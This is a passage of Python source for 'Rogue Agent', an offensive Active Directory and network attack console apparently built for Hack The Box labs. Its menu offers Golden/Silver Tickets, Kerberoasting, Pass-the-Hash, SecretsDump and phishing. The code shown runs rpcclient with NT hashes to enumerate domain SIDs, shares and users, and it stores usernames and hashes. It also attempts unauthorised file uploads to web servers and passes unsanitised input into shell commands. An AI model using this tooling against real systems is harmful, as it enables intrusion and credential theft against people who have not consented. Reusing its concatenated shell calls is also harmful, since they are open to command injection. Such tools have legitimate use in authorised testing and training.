      print(colored(USER[8],colour2), end=' ')
      print(colored(HASH[8],colour2), end=' ')
   else:
      print(colored(USER[8],colour6), end=' ')
      print(colored(HASH[8],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " DOMAIN NAME  " + '\u2551', end=' ')
   if DOM[:5] == "EMPTY":
      print(colored(DOM[:COL1],colour7), end=' ')
   else:
      print(colored(DOM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[9]:
      print(colored(SHAR[9],colour3), end=' ')
   else:
      print(colored(SHAR[9],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[9] == "1":
      print(colored(USER[9],colour2), end=' ')
      print(colored(HASH[9],colour2), end=' ')
   else:
      print(colored(USER[9],colour6), end=' ')
      print(colored(HASH[9],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " DOMAIN  SID  " + '\u2551', end=' ')
   if SID[:5] == "EMPTY":
      print(colored(SID[:COL1],colour7), end=' ')
   else:
      print(colored(SID[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[10]:
      print(colored(SHAR[10],colour3), end=' ')
   else:
      print(colored(SHAR[10],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[10] == "1":
      print(colored(USER[10],colour2), end=' ')
      print(colored(HASH[10],colour2), end=' ')
   else:
      print(colored(USER[10],colour6), end=' ')
      print(colored(HASH[10],colour6), end=' ')         
   print('\u2551')    
   print('\u2551' + " FILE   NAME  " + '\u2551', end=' ')
   if FIL[:5] == "EMPTY":
      print(colored(FIL[:COL1],colour7), end=' ')
   else:
      print(colored(FIL[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[11]:
      print(colored(SHAR[11],colour3), end=' ')
   else:
      print(colored(SHAR[11],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[10] == "1":
      print(colored(USER[11],colour2), end=' ')
      print(colored(HASH[11],colour2), end=' ')
   else:
      print(colored(USER[11],colour6), end=' ')
      print(colored(HASH[11],colour6), end=' ')         
   print('\u2551') 
   
   print('\u2551' + " SHARE  NAME  " + '\u2551', end=' ')
   if TSH[:5] == "EMPTY":
      print(colored(TSH[:COL1],colour7), end=' ')
   else:
      print(colored(TSH[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[12]:
      print(colored(SHAR[12],colour3), end=' ')
   else:
      print(colored(SHAR[12],colour6), end=' ')      
   print('\u2551', end=' ')   
   if VALD[11] == "1":
      print(colored(USER[12],colour2), end=' ')
      print(colored(HASH[12],colour2), end=' ')
   else:
      if USER[13][:1] != "":
         print(colored(USER[12],colour0), end=' ')
         print(colored(HASH[12],colour0), end=' ')      
      else:
         print(colored(USER[12],colour6), end=' ')
         print(colored(HASH[12],colour6), end=' ')
   print('\u2551')      
   print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
   return
   
def options():
   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (21) Get Arch (31) WinLDAP Search (41) Kerberos Info (51) Gold Ticket (61) ServScanner (71) FILE Editor (81) FTP     " + '\u2551')
   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set FILE NAME (22) Net View (32) Look up SecIDs (42) Kerberos Auth (52) Gold DC PAC (62) VulnScanner (72)", end= ' ')
   if proxyChains == 1:
      print(colored(menuName,colour0, attrs=['blink']), end= ' ')
   else:
      print(menuName, end= ' ')
   print("(82) SSH     " + '\u2551')   
   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set SHARENAME (23) Services (33) Sam Dump Users (43) KerberosBrute (53) Domain Dump (63) ExplScanner (73) GenSSHKeyID (83) SSHKeyID" + '\u2551')   
   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Start SERVICE (24) AT  Exec (34) REGistry Hives (44) KerbeRoasting (54) Blood Hound (64) Expl Finder (74) GenListUser (84) Telnet  " + '\u2551')
   print('\u2551' + "(05) Re/Set WEBSITE URL (15) DNS Enumerations (25) DComExec (35) Enum EndPoints (45) ASREPRoasting (55) BH ACL PAWN (65) ExplCreator (75) GenListPass (85) Netcat  " + '\u2551')
   print('\u2551' + "(06) Re/Set USER   NAME (16) Nmap Live  PORTS (26) PS  Exec (36) Rpc ClientServ (46) PASSWORD2HASH (56) SecretsDump (66) Dir Listing (76) NTDSDECRYPT (86) MSSQL   " + '\u2551')
   print('\u2551' + "(07) Re/Set PASS   WORD (17) Nmap PORTService (27) SMB Exec (37) Smb ClientServ (47) Pass the HASH (57) CrackMapExe (67) SNMP Walker (77) Hail! HYDRA (87) MySQL   " + '\u2551')
   print('\u2551' + "(08) Re/Set NTLM   HASH (18) Enum Sub-DOMAINS (28) WMO Exec (38) Smb Map SHARES (48) OverPass HASH (58) PSExec HASH (68) ManPhishCod (78) RedisClient (88) WinRm   " + '\u2551')
   print('\u2551' + "(09) Re/Set TICKET NAME (19) EnumVirtualHOSTS (29) NFS List (39) Smb Dump Files (49) Kerbe5 Ticket (59) SmbExecHASH (69) AutoPhisher (79) Remote Sync (89) RemDesk " + '\u2551')
   print('\u2551' + "(10) Re/Set DOMAIN NAME (20) WordpressScanner (30) NFSMount (40) Smb MountSHARE (50) Silver Ticket (60) WmiExecHASH (70) LFI Checker (80) Rsync Dumps (90) Exit    " + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : START OF MAIN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   proxyChains = 0
   menuName = "ProxyChains"
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if netWork == "":
   netWork = "tun0"							# HTB DEFUALT INTERFACE
maxUser = 5000								# UNLIMITED VALUE
colour0 = "red"								# DISPLAY COLOURS
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"
Yellow  = '\e[1;93m'							# OP SYSTEM COLOUR
Green   = '\e[0;32m'
Reset   = '\e[0m'
Red     = '\e[1;91m'
dataDir = "ROGUEAGENT"							# LOCAL DIRECTORYS
httpDir = "TREADSTONE"
workDir = "BLACKBRIAR"
explDir = "OUTCOME"
powrDir = "LARX"
fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,htm,pdf,dat,asp"	# FILE EXTENSIONS
keyPath = "python3 /usr/share/doc/python3-impacket/examples/"		# PATH 2 IMPACKET

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the local interface specified above is up.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("ifconfig -a | grep -E -o '.{0,5}: flag.{0,5}' | grep -E -o '.{0,5}:' > up.tmp")
with open("up.tmp","r") as localInterface:
   up = localInterface.readlines()
if netWork not in str(up):
   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 825 of the rogue-agent.py file...", colour0))
   exit(1)
else:
   os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
   localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Connect to local database
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if not os.path.exists(dataDir + "/RA.db"):
   print(colored("[!] WARNING!!! - Unable to connect to database...", colour0))
   exit(1)
else:
   connection = sqlite3.connect(dataDir + "/RA.db")
   cursor = connection.cursor()

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

runCommand("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
dispBanner("ROGUE  AGENT",1)
print(colored("\t\tT R E A D S T O N E  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))
print("[+] Using localhost IP address " + localIP + "...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

dirList = [dataDir, workDir, httpDir, explDir, powrDir]
for x in range(0, len(dirList)):
   if not os.path.exists(dirList[x]):
      print("[-] Missing required files, you must run install.py first...")
      exit(1)
   else:
      print("[+] Directory " + dirList[x] + " already exists...")               
print("[+] Populating system variables...")
if not os.path.exists(dataDir + "/usernames.txt"):			
   runCommand("touch " + dataDir + "/usernames.txt")
   print("[+] File usernames.txt created...")
else:
   print("[+] File usernames.txt already exists...")       
if not os.path.exists(dataDir + "/passwords.txt"):			
   runCommand("touch " + dataDir + "/passwords.txt")
   print("[+] File passwords.txt created...")
else:
   print("[+] File passwords.txt already exists...")      
if not os.path.exists(dataDir + "/hashes.txt"):			
   runCommand("touch " + dataDir + "/hashes.txt")
   print("[+] File hashes.txt created...")
else:
   print("[+] File hashes.txt already exists...")        
if not os.path.exists(dataDir + "/shares.txt"):
   runCommand("touch " + dataDir + "/shares.txt")
   print("[+] File shares.txt created...")
else:
   print("[+] File shares.txt already exists...")        
if not os.path.exists(dataDir + "/tokens.txt"):
   runCommand("touch " + dataDir + "/tokens.txt")
   print("[+] File tokens.txt created...")
else:
   print("[+] File tokens.txt already exists...")   
localTime = 0                                # TIME-localTime SWITCH
DOMC = 0                                # DOMAIN SWITCH
DNSC = 0                                # DNS SWITCH
HTTP = 0				# HTTP SERVER PORT
COL0 = 19				# MAX LEN COMPUTER NAME
COL1 = 40                               # MAX LEN SESSION DATA
COL2 = 44                               # MAX LEN SHARE NAME
COL3 = 23                               # MAX LEN USER NAME
COL4 = 32                               # MAX LEN NTLM HASH
COL5 = 1                                # MAX LEN TOKEN VALUE
SHAR = [" "*COL2]*maxUser		# SHARE NAMES
USER = [" "*COL3]*maxUser		# USER NAMES
HASH = [" "*COL4]*maxUser		# NTLM HASH
VALD = ["0"*COL5]*maxUser		# USER TOKENS

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check the database for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

print("[+] Configuration database found - restoring saved data....")
col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
runCommand("echo " + col[1]  + " | base64 -d >  ascii.tmp")
runCommand("echo " + col[2]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[3]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[4]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[5]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[6]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[7]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[8]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[9]  + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[10] + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[11] + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[12] + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[13] + " | base64 -d >> ascii.tmp")
runCommand("echo " + col[14] + " | base64 -d >> ascii.tmp")
OSF = linecache.getline("ascii.tmp", 1).rstrip("\n")
COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
DNS = linecache.getline("ascii.tmp", 3).rstrip("\n")
TIP = linecache.getline("ascii.tmp", 4).rstrip("\n")
PTS = linecache.getline("ascii.tmp", 5).rstrip("\n")
WEB = linecache.getline("ascii.tmp", 6).rstrip("\n")
USR = linecache.getline("ascii.tmp", 7).rstrip("\n")
PAS = linecache.getline("ascii.tmp", 8).rstrip("\n")
NTM = linecache.getline("ascii.tmp", 9).rstrip("\n")
TGT = linecache.getline("ascii.tmp", 10).rstrip("\n")
DOM = linecache.getline("ascii.tmp", 11).rstrip("\n")
SID = linecache.getline("ascii.tmp", 12).rstrip("\n")
FIL = linecache.getline("ascii.tmp", 13).rstrip("\n")
TSH = linecache.getline("ascii.tmp", 14).rstrip("\n")
if USR.rstrip(" ") == "":
   USR = "\'\'"   
if PAS.rstrip(" ") == '':
   PAS = "\'\'"
POR = PTS
OSF = spacePadding(OSF, COL1)
COM = spacePadding(COM, COL0)
DNS = spacePadding(DNS, COL1)
TIP = spacePadding(TIP, COL1)
POR = spacePadding(POR, COL1)
WEB = spacePadding(WEB, COL1)
USR = spacePadding(USR, COL1)
PAS = spacePadding(PAS, COL1)
NTM = spacePadding(NTM, COL1)
TGT = spacePadding(TGT, COL1)
DOM = spacePadding(DOM, COL1)
SID = spacePadding(SID, COL1)
FIL = spacePadding(FIL, COL1)
TSH = spacePadding(TSH, COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Check other files for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2, open(dataDir + "/tokens.txt", "r") as read3, open(dataDir + "/shares.txt", "r") as read4:
   for x in range(0, maxUser):
      USER[x] = read1.readline()
      HASH[x] = read2.readline()
      VALD[x] = read3.readline()
      SHAR[x] = read4.readline()            
      SHAR[x] = spacePadding(SHAR[x], COL2)         
      USER[x] = spacePadding(USER[x], COL3)
      HASH[x] = spacePadding(HASH[x], COL4)    
      VALD[x] = spacePadding(VALD[x], COL5)
if DNS[:5] != "EMPTY":
   runCommand("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
   DNSC = 1
if DOM[:5] != "EMPTY":
   runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
   DOMC = 1        
count = TIP.count(':')      
if count > 1:
   IP46 = "-6"
else:
   IP46 = "-4"      
time.sleep(5)
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   clearClutter()
   checkParams = 0							# RESET'S VALUE
   LTM = getTime()							# GET CLOCKTIME
   runCommand("clear")							# CLEARS SCREEN
   dispMenu()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Secret option that autofill's PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      PTS = checkPorts(PTS, POR)
      POR = spacePadding(PTS, COL1)      
      squidCheck()
      localTime = ServerSync(localTime)      
      print(colored("[*] Attempting to connect to rpcclient...", colour3))                                             
      if NTM[:5] != "EMPTY": 
         print("[i] Using HASH value as password credential for rpcclient...")
         runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
      else:
         runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
      errorCheck = linecache.getline("lsaquery.tmp", 1)                              
      if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
         print("[-] Unable to connect to RPC data...")
         checkParams = 1
      else:
         print("[+] Connection successful...")               
      if checkParams != 1:
         print(colored("[*] Attempting to enumerate domain name...", colour3))               
         try:
            null,DOM = errorCheck.split(":")
            SID = " "*COL1
         except ValueError:
            DOM = "EMPTY" 
         DOM = DOM.lstrip(" ")
         DOM = spacePadding(DOM, COL1)                  
         if DOM[:5] == "EMPTY":
            print("[+] Unable to enumerate domain name...")
         else:
            print("[+] Found domain name...\n")
            print(colored(DOM,colour6))                      
 
         if DOMC == 1:
            print("\n[*] Resetting current domain associated host...")
            runCommand("sed -i '$d' /etc/hosts")
            runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
         else:
            runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("\n[+] Domain " + DOM.rstrip(" ") + " successfully added to /etc/hosts...")
            DOMC = 1                                
         print(colored("[*] Attempting to enumerate domain SID...", colour3))                        
         line2 = linecache.getline("lsaquery.tmp", 2)
         try:
            null,SID = line2.split(":") 
         except ValueError:
            SID = "EMPTY"        
         SID = SID.lstrip(" ")          
         SID = spacePadding(SID, COL1)                    
         if SID[:5] == "EMPTY":
            print("[+] Unable to enumerate domain SID...")
         else:
            print("[+] Found SID...\n")
            print(colored(SID,colour6) + "\n")                
         print(colored("[*] Attempting to enumerate shares...", colour3))                  
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
         else:
            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
         errorCheck = linecache.getline("shares.tmp", 1)   
         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print("[-] Access to RPC data restricted...")
         else:
            for x in range(0, maxUser):
               SHAR[x] = " "*COL2
            runCommand("sed -i -n '/netname: /p' shares.tmp")
            runCommand("sed -i '/^$/d' shares.tmp")
            runCommand("cat shares.tmp | sort > sshares.tmp")            
            count = lineCount("sshares.tmp")                           
            if count > 0:
               print("[+] Found shares...\n")
               with open("sshares.tmp") as read:
                  for x in range(0, count):
                     SHAR[x]  = read.readline()
                     SHAR[x] = SHAR[x].replace(" ","")
                     try:
                        null, SHAR[x] = SHAR[x].split(":")
                     except ValueError:
                        SHAR[x] = "Error..."
                     print(colored(SHAR[x].rstrip("\n"),colour6))
                     SHAR[x] = dotPadding(SHAR[x], COL2)
                  print("")                  
         print(colored("[*] Attempting to enumerate domain users...", colour3))
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
         else:
            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
         errorCheck = linecache.getline("domusers.tmp", 1)
         if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
            print("[-] Access to RPC data restricted...")
         else:               
            runCommand("rm " + dataDir + "/usernames.txt")
            runCommand("rm " + dataDir + "/hashes.txt")                   
            runCommand("sort domusers.tmp > sdomusers.tmp")
            runCommand("sed -i '/^$/d' sdomusers.tmp")            
            count2 = lineCount("sdomusers.tmp")             
            if count2 > 0:
                print ("[+] Found users...\n")
                with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
                   for x in range(0, count2):
                      line = read.readline()
                      if "user:[Guest]" in line:
                         null,rid = line.split("rid:")
                         rid = rid.replace("[","")
                         rid = rid.replace("]","")
                      try:
                         null1,USER[x],null2 = line.split(":")
                      except ValueError:
                         USER[x] = "Error..."                           
                      USER[x] = USER[x].replace("[","")
                      USER[x] = USER[x].replace("]","")
                      USER[x] = USER[x].replace("rid","")                     
                      if USER[x][:5] != "Error":
                         USER[x] = spacePadding(USER[x], COL3)
                         HASH[x] = spacePadding("", COL4)
                         if USER[x][:1] != " ":
                            write1.write(USER[x].rstrip(" ") + "\n")
                            write2.write(HASH[x].rstrip(" ") + "\n")                                                         
                            print(colored(USER[x],colour6))
            else:
               print("[+] Unable to enumerate domain users...")            
            print(colored("\n[*] Attempting to enumerate Guest password policy...", colour3))
            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")            
            runCommand("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
            runCommand("sed -i '/^s*$/d' policy.tmp 2>&1")
            catsFile("policy.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Details : 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '1':
      BAK = OSF
      OSF = input("[?] Please enter O/S format: ")      
      found = 0      
      if OSF != "":
         OSF = OSF.upper()
         if "EMPTY" in OSF:
            found = 1
         if "WINDOWS" in OSF:
            found = 1
         if "LINUX" in OSF:
            found = 1
         if "OS X " in OSF:
            found = 1
         if "ANDROID" in OSF:
            found = 1
         if "IOS" in OSF:
            found = 1
         if "FREEBSD" in OSF:
            found=1   
         if found == 0:
            print("[-] Operating system not found...")
            OSF = BAK
         else:
            print("[+] O/S succesfully set to " + OSF)
            OSF = spacePadding(OSF, COL1)
      else:
         print("[-] No changes were made...")
         OSF = BAK
      prompt()      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = DNS
      DNS = input("[?] Please enter DNS IP address: ")      
      if DNS == "":
         DNS = BAK
      else:
         DNS = spacePadding(DNS, COL1)            
         if DNSC == 1:
            print("[+] Resetting current DNS IP association...")
            runCommand("sed -i '$d' /etc/resolv.conf")
            DNSC = 0            
         if DNSC == 0:
            if DNS[:5] != "EMPTY":
               count = DNS.count(':')       
               if count > 1:
                  print("[+] Defualting to IP 6...")
                  IP46 = "-6"
               else:
                  print("[+] Defaulting to IP 4...")
                  IP46 = "-4"                  
               print("[+] Adding DNS IP " + DNS.rstrip(" ") + " to /etc/resolv.conf...")
               runCommand("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
               DNSC = 1               
         if DNSC == 1:
            COM = checkInterface("DNS", COM)
            networkSweep()
            checkBIOS()            
         prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='3':
      BAK = TIP
      TIP = input("[?] Please enter remote IP address: ").upper()
      
      if ".CO" in TIP.upper():
         runCommand("dig +short " + TIP + " > ip.tmp")
         TIP = linecache.getline("ip.tmp", 1)
      if TIP[:1] == "":
         TIP = BAK
      else:
         TIP = spacePadding(TIP, COL1)        
      if TIP[:5] == "EMPTY":
         print("[+] Resetting remote IP address...")
      else:
         checkParams = 0
         count = TIP.count(':')            
         if count == 6:
            try:
               bit1,bit2,bit3,bit4,bit5,bit6,bit7 = TIP.split(":")
               print("[+] Defualting to internet protocol 6...")
               IP46 = "-6"
               checkParams = 1
            except:
               print("[-] Unknown internet protocol...")
               TIP = spacePadding("EMPTY", COL1)                              
         count = TIP.count(".")         
         if count == 3:
            try:
               bit1,bit2,bit3,bit4 = TIP.split(".")
               print("[+] Defaulting to internet protocol 4...")
               IP46 = "-4"
               checkParams = 1
            except:
               print("[-] Unknown internet protocol...")
               TIP = spacePadding("EMPTY", COL1)                     
         if checkParams == 1:
            COM = checkInterface("TIP", COM)
            networkSweep()
            checkBIOS()
         else:
            print("[-] Unknown internet protocol...")
            TIP = spacePadding("EMPTY", COL1)                         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      print("[i] Current live port listing: " + PTS)
      BAK = POR
      POR = input("[?] Please enter port numbers: ")      
      if POR != "":
         PTS = POR
         POR = spacePadding(POR, COL1)
      else:
         POR = BAK
      squidCheck()
      localTime = ServerSync(localTime)
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the web address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = WEB
      WEB = input("[?] Please enter the web address: ")      
      if WEB != "":
         if len(WEB) < COL1:
            WEB = spacePadding(WEB, COL1)
         if proxyChains != 1:
            print(colored("[*] Enumerating website url for verbs...", colour3))
            runCommand("wfuzz -f verbs.tmp,raw -z list,PUT-DELETE-GET-HEAD-POST-TRACE-OPTIONS -X FUZZ " + WEB.rstrip(" ") + " > temp.tmp 2>&1")
            cutLine("Pycurl is not compiled against Openssl","verbs.tmp")
            cutLine("Target","verbs.tmp")
            cutLine("Total requests","verbs.tmp")
            cutLine("Total time","verbs.tmp")
            cutLine("Processed Requests","verbs.tmp")
            cutLine("Filtered Requests","verbs.tmp")
            cutLine("Requests","verbs.tmp")
            parsFile("verbs.tmp")
            catsFile("verbs.tmp")
            checkWAF()
         else:
            print("[-] Proxychains enabled, no verb enumeration available...")
            
         print(colored("\n[*] Checking to see if I can upload a file to this location...", colour3))
         runCommand("echo '<html>Rogue Agent</html>' > rogue.html")
         runCommand("curl " + WEB.strip(" ") + " --upload-file rogue.html 2> test.tmp 1>check.tmp")
         errorCheck = linecache.getline("check.tmp", 1)
         if errorCheck == "":
            print("[+] Looks like it might have worked!! - manualy check the web browser for /rogue.html...")
         else:
            print("[-] 404 Not Found...")
      else:
         WEB = BAK
         print("[-] No action has been taken...")   
      prompt()         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = USR
      USR = input("[?] Please enter username: ")
      if USR == "":
         USR = BAK         
      if USR.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))
      if USR[:2] == "''":
         USR = "''"
      if USR.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         USR = BAK         
      USR = spacePadding(USR, COL1)
      NTM = "EMPTY"      
      for x in range(0, maxUser):
         if USER[x].rstrip(" ") == USR.rstrip(" "):
            NTM = HASH[x]
            if NTM[:1] == " ":
               NTM = "EMPTY"                            
      NTM = spacePadding(NTM, COL1)           
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = PAS
      PAS = input("[?] Please enter password: ")      
      if PAS == "":
         PAS = BAK         
      if PAS.find("'") != -1:
         print(colored("[!] CAUTION!!! - Password contains a character that may break other parts of this program...", colour0))         
      if PAS[:2] == "''":
         PAS = "''"         
      if PAS.find("\"") != -1:
         print(colored("[!] WARNING!!! - Password contains an illegal character...", colour0))
         PAS = BAK         
      PAS = spacePadding(PAS, COL1)
      NTM = spacePadding("EMPTY", COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS HASH value
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = NTM
      NTM = input("[?] Please enter hash value: ")      
      if NTM != "":
         NTM = spacePadding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the ticket name
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = TGT
      TGT = input("[?] Please enter ticket name: ")      
      if TGT != "":
         TGT = spacePadding(TGT, COL1)
      else:
         TGT = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

